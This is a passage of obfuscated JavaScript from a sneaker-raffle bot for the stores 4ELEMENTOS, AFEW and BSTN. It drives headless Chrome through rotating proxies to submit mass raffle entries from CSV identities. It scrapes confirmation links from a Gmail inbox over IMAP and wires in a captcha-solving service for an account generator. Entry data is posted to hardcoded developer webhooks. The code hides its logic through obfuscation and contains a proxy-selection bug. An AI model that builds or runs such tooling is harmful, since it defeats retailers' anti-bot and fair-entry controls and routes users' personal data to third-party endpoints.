                        await _0x38eff1(_0x401115, _0xc4679d), _0x535b9c(_0x18c8db['name'] + '\x20Task\x20' + (_0xc4679d + 0x1) + '\x20/\x20' + _0x401115['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d);
                        var _0x4ccd02 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x266d33 = Math['round'](Math['random']() * (_0x4ccd02['length'] - 0x1));
                        _0x401115[_0xc4679d]['Size'] == 'RANDOM' && (_0x401115[_0xc4679d]['Size'] = _0x4ccd02[_0x266d33]);
                        var _0x37b6e9 = Math['round'](Math['random']() * (_0x48629d['length'] - 0x1)), _0x11d3f6 = _0x48629d[_0x37b6e9]['split'](':'), _0x23914d;
                        try {
                            _0x23914d = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11d3f6[0x0] + ':' + _0x11d3f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x23914d = await _0x4e5975['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11d3f6[0x0] + ':' + _0x11d3f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x2da253 = await _0x23914d['newPage']();
                            await _0x2da253['authenticate']({
                                'username': '' + _0x11d3f6[0x2],
                                'password': '' + _0x11d3f6[0x3]
                            }), await _0x2da253['setRequestInterception'](!![]), _0x2da253['on']('request', _0x501676 => {
                                _0x501676['resourceType']() === 'image' || _0x501676['resourceType']() === 'font' || _0x501676['resourceType']() === 'media' ? _0x501676['abort']() : _0x501676['continue']();
                            }), await _0x2da253['goto'](_0x401115[_0xc4679d]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x2da253['waitForSelector']('#accept-all-gdpr'), await _0x2da253['click']('#accept-all-gdpr'), await _0x2da253['waitForSelector']('#raffles-product'), await _0x2bc7d2(0x3e8), await _0x2da253['$eval']('#raffles-product', _0x38e97b => _0x38e97b['click']()), await _0x2bc7d2(0x1388), await _0x2da253['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x113e43 = await _0x2da253['$']('.fancybox-inner\x20>\x20iframe'), _0x182060 = await _0x113e43['contentFrame']();
                            console['log'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20Checking\x20Information'), await _0x182060['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x2bc7d2(0x1f4), await _0x182060['type']('input[name=\x22sm-form-email\x22]', _0x401115[_0xc4679d]['Email']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-form-name\x22]', _0x401115[_0xc4679d]['FirstName'] + '\x20' + _0x401115[_0xc4679d]['LastName']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-form-street\x22]', _0x401115[_0xc4679d]['Address1'] + '\x20' + _0x401115[_0xc4679d]['HouseNumber'] + '\x20' + _0x401115[_0xc4679d]['Address2']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-form-city\x22]', _0x401115[_0xc4679d]['City']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-form-province\x22]', _0x401115[_0xc4679d]['State']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-form-zip\x22]', _0x401115[_0xc4679d]['Zip']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-form-country\x22]', _0x401115[_0xc4679d]['Country']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-form-phone\x22]', _0x401115[_0xc4679d]['Phone']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x401115[_0xc4679d]['Follower']), await _0x2bc7d2(0xc8), await _0x182060['type']('input[name=\x22sm-cst.size\x22]', _0x401115[_0xc4679d]['Size']), await _0x2bc7d2(0x1f4), await _0x182060['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x2bc7d2(0x1f4), await _0x182060['click']('.icheckbox_simple-custom'), await _0x2bc7d2(0x1f4), console['log'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20Sending\x20Request'), await _0x182060['$eval']('form', _0x5b935c => _0x5b935c['submit']()), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x7be51c = '';
                            var _0x19a94c = await _0x1487ea(_0x401115[_0xc4679d], _0x18c8db, 'dev', ![]), _0x120717 = await _0x1487ea(_0x401115[_0xc4679d], _0x18c8db, 'pub', ![]);
                            const _0x2f30d4 = {
                                'succesDEVMSG': { 'embeds': [_0x19a94c] },
                                'succesPUBMSG': { 'embeds': [_0x120717] }
                            };
                            try {
                                _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x2f30d4['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x2f30d4['succesDEVMSG']), await _0x2bc7d2(0xc8), await _0x5e696c(_0x3ebea8, _0x2f30d4['succesPUBMSG']);
                            } catch (_0x8a5924) {
                                console['log'](_0x49dcd4['yellow'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x8a5924));
                            }
                        } catch (_0x4f64f0) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20' + _0x4f64f0)), _0x377758 = '' + _0x4f64f0;
                            var _0x5388c6 = await _0x1487ea(_0x401115[_0xc4679d], _0x18c8db, 'dev', !![], _0x377758), _0x19a94c = await _0x1487ea(_0x401115[_0xc4679d], _0x18c8db, 'dev', ![]), _0x120717 = await _0x1487ea(_0x401115[_0xc4679d], _0x18c8db, 'pub', ![]);
                            const _0x2c3bd0 = {
                                'succesDEVMSG': { 'embeds': [_0x19a94c] },
                                'succesPUBMSG': { 'embeds': [_0x120717] }
                            };
                            _0x2c3bd0['errorDEV'] = { 'embeds': [_0x5388c6] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x2c3bd0['errorDEV']), await _0x5e696c(_0x8997ff, _0x2c3bd0['errorDEV']), _0x4f64f0 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x7be51c = 'yes');
                        } finally {
                            _0x23914d['close']();
                            if (_0x7be51c == 'yes' && _0x5c0aca != 0x5 && _0x377758 != 'Size\x20Not\x20Found') {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Task\x20' + (_0xc4679d + 0x1) + '\x20:\x20Retrying')), _0xc4679d = _0xc4679d - 0x1, _0x5c0aca = _0x5c0aca + 0x1;
                                continue;
                            }
                            _0x7be51c == 'yes' && _0x5c0aca >= 0x5 && (_0x4b302f(_0x401115[_0xc4679d], _0x18c8db), _0x7be51c = 'no', _0x5c0aca = 0x0), console['log'](_0x207f7e() + '\x20[' + _0x18c8db['name'] + ']\x20Waiting\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x8bf663, _0x57ea9a) {
                    var _0x36c134 = [];
                    async function _0x18dd49() {
                        var _0xedcfba = new _0x91ddb5({
                            'user': _0x397a11['masterMail'],
                            'password': _0x397a11['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4fd010(_0x3034be) {
                            _0xedcfba['openBox']('INBOX', ![], _0x3034be);
                        }
                        _0xedcfba['once']('ready', function () {
                            _0x4fd010(function (_0x5618d3, _0x2d8423) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x5618d3)
                                    throw _0x5618d3;
                                _0xedcfba['seq']['search'](['UNSEEN'], function (_0x4ca0a8, _0x94b7ad) {
                                    if (!_0x94b7ad || !_0x94b7ad['length'])
                                        console['log'](_0x207f7e() + '\x20[' + _0x8bf663['name'] + ']\x20No\x20mails\x20found'), _0xedcfba['end']();
                                    else {
                                        var _0x54e20e = _0xedcfba['seq']['fetch'](_0x94b7ad, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x54e20e['on']('message', function (_0x135455, _0x1dd884) {
                                            var _0xbf02a1 = '(#' + _0x1dd884 + ')\x20';
                                            _0x135455['on']('body', function (_0x39ef8d, _0x2a2cd1) {
                                                _0x3631ef(_0x39ef8d, (_0x1ca813, _0x2e4122) => {
                                                    if (_0x2e4122['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0xa13be = _0x2e4122['html']['split']('\x0a');
                                                        for (var _0x34a801 = 0x0; _0x34a801 < _0xa13be['length']; _0x34a801++) {
                                                            if (_0xa13be[_0x34a801]['includes']('salesmanago') && _0xa13be[_0x34a801]['includes']('<td') && _0xa13be[_0x34a801]['includes']('href')) {
                                                                var _0x59cff6 = _0xa13be[_0x34a801]['split']('href=\x22'), _0x164886 = _0x59cff6[0x1]['split']('\x22')[0x0];
                                                                _0x36c134['push'](_0x164886);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x135455['once']('end', function () {
                                            });
                                        }), _0x54e20e['once']('error', function (_0xfcaf5c) {
                                            console['log']('Fetch\x20error:\x20' + _0xfcaf5c);
                                        }), _0x54e20e['once']('end', function () {
                                            _0xedcfba['end']();
                                        });
                                    }
                                });
                            });
                        }), _0xedcfba['once']('error', function (_0x34482c) {
                            console['log'](_0x49dcd4['red'](_0x34482c['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0xedcfba['once']('end', async function () {
                        }), _0xedcfba['connect']();
                    }
                    async function _0x42d696(_0x261d3c, _0x4f6e88, _0x469ad5) {
                        for (var _0x3aa734 = 0x0; _0x3aa734 < _0x4f6e88['length']; _0x3aa734++) {
                            async function _0x129f25(_0x4daad4, _0x3fd2d5, _0x4b60f2, _0x28391a, _0x208b84) {
                                var _0x240e04, _0x36cf49 = {}, _0x42164c = [], _0x1e2a3f = {}, _0x34d846 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x564e6b = Math['round'](Math['random']() * (_0x34d846['length'] - 0x1));
                                _0x28391a[_0x4daad4]['Size'] == 'RANDOM' && (_0x28391a[_0x4daad4]['Size'] = _0x34d846[_0x564e6b]);
                                !_0x28391a && (_0x28391a = {});
                                if (_0x397a11['useRandomProxy'] = ![])
                                    var _0x5e45ad = _0x208b84[_0x4daad4]['split'](':');
                                else
                                    var _0x1924fb = Math['round'](Math['random']() * (_0x208b84['length'] - 0x1)), _0x5e45ad = _0x208b84[_0x1924fb]['split'](':');
                                var _0x56e0ea = {
                                    'jar': _0x45e81e,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x4b60f2['url'],
                                    'headers': _0x4b60f2['headers'],
                                    'body': JSON['stringify'](_0x36cf49),
                                    'proxy': 'http://' + _0x5e45ad[0x2] + ':' + _0x5e45ad[0x3] + '@' + _0x5e45ad[0x0] + ':' + _0x5e45ad[0x1]
                                };
                                return _0x3fd2d5 != 'ver' && (_0x56e0ea['url'] = _0x4b60f2['url'], _0x56e0ea['headers'] = _0x4b60f2['headers']), _0x3fd2d5 == 'ver' && (_0x56e0ea['method'] = 'GET', _0x56e0ea['url'] = _0x28391a[_0x4daad4]), new Promise(function (_0x50bf26, _0x7fe845) {
                                    callback = async (_0x2ec09f, _0x2df7bb, _0x2b80eb) => {
                                        if (!_0x2ec09f && _0x2df7bb['statusCode'] == 0xca || !_0x2ec09f && _0x2df7bb['statusCode'] == 0xc8) {
                                            if (_0x3fd2d5 != 'ver') {
                                                var _0x20734a = await _0x1487ea(_0x28391a[_0x4daad4], _0x4b60f2, 'dev', ![]), _0x37c245 = await _0x1487ea(_0x28391a[_0x4daad4], _0x4b60f2, 'pub', ![]);
                                                const _0xb4b001 = {
                                                    'succesDEVMSG': { 'embeds': [_0x20734a] },
                                                    'succesPUBMSG': { 'embeds': [_0x37c245] }
                                                };
                                                if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                                                    try {
                                                        await _0x5e696c(_0x397a11['webhook'], _0xb4b001['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0xb4b001['succesDEVMSG']), await _0x2bc7d2(0xc8);
                                                try {
                                                    await _0x5e696c(_0x3ebea8, _0xb4b001['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1560d5(_0x28391a[_0x4daad4], _0x4b60f2);
                                            }
                                            _0x50bf26(console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x4b60f2['name'] + ']\x20Task\x20' + (_0x4daad4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x3fd2d5 != 'ver') {
                                                var _0xa42ebc = '' + _0x2ec09f, _0x20178d = await _0x1487ea(_0x28391a[_0x4daad4], _0x4b60f2, 'dev', !![], _0xa42ebc), _0xcd83f5 = {};
                                                _0xcd83f5['errorDEV'] = { 'embeds': [_0x20178d] }, _0x4b302f(_0x28391a[_0x4daad4], _0x4b60f2), _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0xcd83f5['errorDEV']), await _0x5e696c(_0x8997ff, _0xcd83f5['errorDEV']);
                                            }
                                            _0x7fe845(console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4b60f2['name'] + ']\x20Task\x20' + (_0x4daad4 + 0x1) + ':\x20' + _0x2ec09f)));
                                        }
                                    };
                                    try {
                                        _0x3fd2d5 != 'ver' ? console['log'](_0x207f7e() + '\x20[' + _0x4b60f2['name'] + ']\x20Task\x20' + (_0x4daad4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x36cf49['data']['attributes']['email']) : console['log'](_0x207f7e() + '\x20[' + _0x4b60f2['name'] + ']\x20Task\x20' + (_0x4daad4 + 0x1) + ':\x20Fetching\x20Response'), _0x5f4dd5(_0x56e0ea, callback);
                                    } catch (_0x526214) {
                                        console['log'](_0x207f7e() + '\x20Task\x20' + (_0x4daad4 + 0x1) + ':\x20' + _0x526214);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x129f25(_0x3aa734, 'ver', _0x261d3c, _0x4f6e88, _0x469ad5), console['log'](_0x207f7e() + '\x20[' + _0x261d3c['name'] + ']\x20Sleeping\x20for\x20' + _0x397a11['delay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['delay']);
                            } catch (_0x53e85a) {
                            }
                        }
                    }
                    try {
                        _0x18dd49(), await _0x2bc7d2(0xfa0), console['log']('Found\x20' + _0x36c134['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x42d696(_0x8bf663, _0x36c134, _0x57ea9a);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x4e7460, _0x110c7f, _0x26ace6) {
                for (var _0x476c5d = 0x0; _0x476c5d < _0x110c7f['length']; _0x476c5d++) {
                    _0x397a11['AfewDelay'] = _0x397a11['delay'];
                    var _0x4e35e9;
                    if (_0x267eb7 != 'yes')
                        var _0x267eb7 = '', _0x4be9ab = 0x0;
                    var _0x20d325 = _0x110c7f[_0x476c5d]['Url'];
                    _0x535b9c(_0x4e7460['name'] + '\x20Task\x20' + (_0x476c5d + 0x1) + '\x20/\x20' + _0x110c7f['length'] + '\x20||\x20File:\x20' + _0x201f86 + '\x20Proxies:\x20' + _0xa80a1d), await _0x38eff1(_0x110c7f, _0x476c5d);
                    var _0x4980cd = await _0x1487ea(_0x110c7f[_0x476c5d], _0x4e7460, 'dev', ![]), _0x2fa1cd = await _0x1487ea(_0x110c7f[_0x476c5d], _0x4e7460, 'pub', ![]);
                    const _0x407031 = {
                        'succesDEVMSG': { 'embeds': [_0x4980cd] },
                        'succesPUBMSG': { 'embeds': [_0x2fa1cd] }
                    };
                    if (_0x110c7f[_0x476c5d]['Email'] == '' || _0x110c7f[_0x476c5d]['FirstName'] == '' || _0x110c7f[_0x476c5d]['LastName'] == '' || _0x110c7f[_0x476c5d]['Country'] == '' || _0x110c7f[_0x476c5d]['Size'] == '' || _0x110c7f[_0x476c5d]['Address1'] == '' || _0x110c7f[_0x476c5d]['Zip'] == '') {
                        console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x397a11['useRandomProxy'] = ![])
                        var _0x20cdbe = _0x26ace6[_0x476c5d]['split'](':');
                    else
                        var _0x19fd13 = Math['round'](Math['random']() * (_0x26ace6['length'] - 0x1)), _0x20cdbe = _0x26ace6[_0x19fd13]['split'](':');
                    const _0x1d889e = await _0x4e5975['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x20cdbe[0x0] + ':' + _0x20cdbe[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x3160a0 = await _0x1d889e['newPage']();
                        await _0x3160a0['setDefaultNavigationTimeout'](0x1d4c0), await _0x3160a0['authenticate']({
                            'username': '' + _0x20cdbe[0x2],
                            'password': '' + _0x20cdbe[0x3]
                        }), console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3160a0['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3160a0['setRequestInterception'](!![]), _0x3160a0['on']('request', _0x15011b => {
                            _0x15011b['resourceType']() === 'image' || _0x15011b['resourceType']() === 'font' || _0x15011b['resourceType']() === 'media' ? _0x15011b['abort']() : _0x15011b['continue']();
                        }), await _0x3160a0['goto'](_0x20d325, { 'waitUntil': 'networkidle2' }), console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x3160a0['waitForTimeout'](0xfa0), console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Cookies\x20received'), await _0x3160a0['waitForTimeout'](0x320);
                        if (_0x110c7f[_0x476c5d]['Size'] == 'RANDOM') {
                            console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x85290a = await _0x3160a0['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x2c1adc => {
                                return _0x2c1adc['map'](_0x3e4567 => _0x3e4567['href']);
                            });
                            var _0x5404a9 = Math['round'](Math['random']() * (_0x85290a['length'] - 0x1));
                            await _0x3160a0['goto']('' + _0x85290a[_0x5404a9]);
                        } else {
                            console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x110c7f[_0x476c5d]['Size']);
                            try {
                                const _0x157f73 = await _0x3160a0['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x110c7f[_0x476c5d]['Size'] + '\x22]\x20>\x20a', _0x5935f => {
                                    return _0x5935f['map'](_0x413687 => _0x413687['href']);
                                });
                                await _0x3160a0['goto']('' + _0x157f73[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0xba099e) {
                                console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20' + _0xba099e + '\x20Size\x20not\x20found')), _0x4e35e9 = 'Size\x20Not\x20Found';
                                var _0x3b0777 = await _0x1487ea(_0x110c7f[_0x476c5d], _0x4e7460, 'dev', !![], _0x4e35e9);
                                _0x407031['errorDEV'] = { 'embeds': [_0x3b0777] };
                                _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x407031['errorDEV']);
                                await _0x5e696c(_0x8997ff, _0x407031['errorDEV']);
                                continue;
                            }
                        }
                        await _0x3160a0['waitForTimeout'](0x258), await _0x3160a0['type']('#raffle-instagram', '' + _0x110c7f[_0x476c5d]['Follower'], { 'delay': 0x64 }), await _0x3160a0['waitForTimeout'](0x384), await _0x3160a0['click']('#raffle-terms'), await _0x3160a0['waitForTimeout'](0x384), await _0x3160a0['evaluate'](() => {
                            const _0x4aed2a = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x4aed2a['click']();
                        }), await _0x3160a0['waitForTimeout'](0xbb8), await _0x3160a0['waitForSelector']('#checkout_email'), await _0x2bc7d2(0x3e8), console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3160a0['type']('#checkout_email', '' + _0x110c7f[_0x476c5d]['Email'], 0x32), await _0x2bc7d2(0x320), await _0x3160a0['select']('#checkout_shipping_address_country', '' + _0x110c7f[_0x476c5d]['Country']), await _0x3160a0['waitForTimeout'](0x258), await _0x3160a0['type']('#checkout_shipping_address_first_name', '' + _0x110c7f[_0x476c5d]['FirstName']), await _0x3160a0['waitForTimeout'](0x320), await _0x3160a0['type']('#checkout_shipping_address_last_name', '' + _0x110c7f[_0x476c5d]['LastName']), await _0x3160a0['waitForTimeout'](0x2bc), await _0x3160a0['type']('#checkout_shipping_address_address1', _0x110c7f[_0x476c5d]['Address1'] + '\x20' + _0x110c7f[_0x476c5d]['HouseNumber']), await _0x3160a0['waitForTimeout'](0x2bc), await _0x3160a0['type']('#checkout_shipping_address_address2', '' + _0x110c7f[_0x476c5d]['Address2']), await _0x3160a0['waitForTimeout'](0x2bc);
                        _0x110c7f[_0x476c5d]['Postcode'] == undefined ? await _0x3160a0['type']('#checkout_shipping_address_zip', '' + _0x110c7f[_0x476c5d]['Zip']) : await _0x3160a0['type']('#checkout_shipping_address_zip', '' + _0x110c7f[_0x476c5d]['Postcode']);
                        await _0x3160a0['waitForTimeout'](0x2bc), await _0x3160a0['type']('#checkout_shipping_address_city', '' + _0x110c7f[_0x476c5d]['City']), await _0x3160a0['waitForTimeout'](0x2bc), console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x3160a0, _0x3160a0['evaluate'](() => {
                            const _0xb614a2 = document['querySelector']('#continue_button');
                            for (var _0x22f2a6 = 0x0; _0x22f2a6 < 0x5; _0x22f2a6++) {
                                if (_0xb614a2) {
                                    _0xb614a2['click'](), _0xb614a2['click']();
                                    break;
                                } else
                                    _0x2bc7d2(0xfa0);
                            }
                        }), await _0x3160a0['waitForTimeout'](0x1194);
                        try {
                            await _0x3160a0['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x3160a0['evaluate'](() => {
                            const _0x44c359 = document['querySelector']('#continue_button');
                            for (var _0xc5a199 = 0x0; _0xc5a199 < 0x5; _0xc5a199++) {
                                if (_0x44c359) {
                                    _0x44c359['click']();
                                    break;
                                } else
                                    _0x2bc7d2(0xfa0);
                            }
                        }), await _0x3160a0['waitForTimeout'](0x7d0), console['log'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x3160a0['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x3160a0['evaluate'](() => {
                            const _0x4a8afd = document['querySelector']('#continue_button');
                            for (var _0x1b85f8 = 0x0; _0x1b85f8 < 0x5; _0x1b85f8++) {
                                if (_0x4a8afd) {
                                    _0x4a8afd['click']();
                                    break;
                                } else
                                    _0x2bc7d2(0xfa0);
                            }
                        }), await _0x3160a0['waitForTimeout'](0x1194), await _0x3160a0['waitForSelector']('#continue_button'), _0x3160a0['evaluate'](() => {
                            const _0x4b8d09 = document['querySelector']('#continue_button');
                            for (var _0x24fad4 = 0x0; _0x24fad4 < 0x5; _0x24fad4++) {
                                if (_0x4b8d09) {
                                    _0x4b8d09['click']();
                                    break;
                                } else
                                    _0x2bc7d2(0xfa0);
                            }
                        });
                        try {
                            await _0x3160a0['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x267eb7 = 'no', _0x1560d5(_0x110c7f[_0x476c5d], _0x4e7460), console['log'](_0x49dcd4['green'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '')
                                try {
                                    await _0x5e696c(_0x397a11['webhook'], _0x407031['succesDEVMSG']);
                                } catch {
                                }
                            await _0x2bc7d2(0xc8), await _0x5e696c(_0x171351, _0x407031['succesDEVMSG']), await _0x2bc7d2(0xc8);
                            try {
                                await _0x5e696c(_0x3ebea8, _0x407031['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x55ee1b) {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x55ee1b));
                        }
                    } catch (_0x35fb0f) {
                        console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20' + _0x35fb0f)), _0x4e35e9 = '' + _0x35fb0f;
                        var _0x3b0777 = await _0x1487ea(_0x110c7f[_0x476c5d], _0x4e7460, 'dev', !![], _0x4e35e9);
                        _0x407031['errorDEV'] = { 'embeds': [_0x3b0777] }, _0x397a11['webhook'] != undefined && _0x397a11['webhook'] != '' && await _0x5e696c(_0x397a11['webhook'], _0x407031['errorDEV']), await _0x5e696c(_0x8997ff, _0x407031['errorDEV']), _0x267eb7 = 'yes';
                    } finally {
                        _0x1d889e && _0x1d889e['close']();
                        if (_0x267eb7 == 'yes' && _0x4be9ab != 0x5 && _0x4e35e9 != 'Size\x20Not\x20Found') {
                            console['log'](_0x49dcd4['red'](_0x207f7e() + '\x20[' + _0x4e7460['name'] + ']\x20Task\x20' + (_0x476c5d + 0x1) + '\x20:\x20Retrying')), _0x476c5d = _0x476c5d - 0x1, _0x4be9ab = _0x4be9ab + 0x1;
                            continue;
                        }
                        _0x267eb7 == 'yes' && _0x4be9ab >= 0x5 && (_0x4b302f(_0x110c7f[_0x476c5d], _0x4e7460), _0x267eb7 = 'no', _0x4be9ab = 0x0);
                        if (_0x476c5d + 0x1 == _0x110c7f['length']) {
                            await _0x2bc7d2(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x397a11['AfewDelay'] + '\x20ms'), await _0x2bc7d2(_0x397a11['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x113ec2, _0x1c0b3a, _0x3a0502) {
                    _0x4e5975['use'](_0x10339b()), _0x4e5975['use'](_0x2e6420({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x397a11['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
